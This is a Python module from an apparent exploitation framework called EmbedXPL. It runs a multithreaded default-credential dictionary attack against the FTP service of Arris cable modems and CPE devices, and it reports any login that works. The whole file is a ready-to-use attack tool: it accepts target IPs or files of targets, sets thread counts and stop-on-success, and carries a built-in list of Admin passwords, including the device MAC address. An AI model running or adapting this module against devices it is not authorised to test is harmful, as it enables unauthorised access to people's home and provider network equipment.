# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    """Arris Cable Modem/CPE — Default FTP Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Arris Cable Modem/CPE Default FTP Creds",
        "description": (
            "Module performs dictionary attack with default credentials against "
            "Arris Cable Modem/CPE FTP service. "
            "If valid credentials are found, they are displayed to the user."
        ),
        "authors": (
            "André Henrique (@mrhenrike) — EmbedXPL-Forge",
        ),
        "devices": (
            "Arris Cable Modem/CPE",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("Admin:1234,Admin:admin,Admin:motorola,Admin:password,Admin:the full MAC address", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")
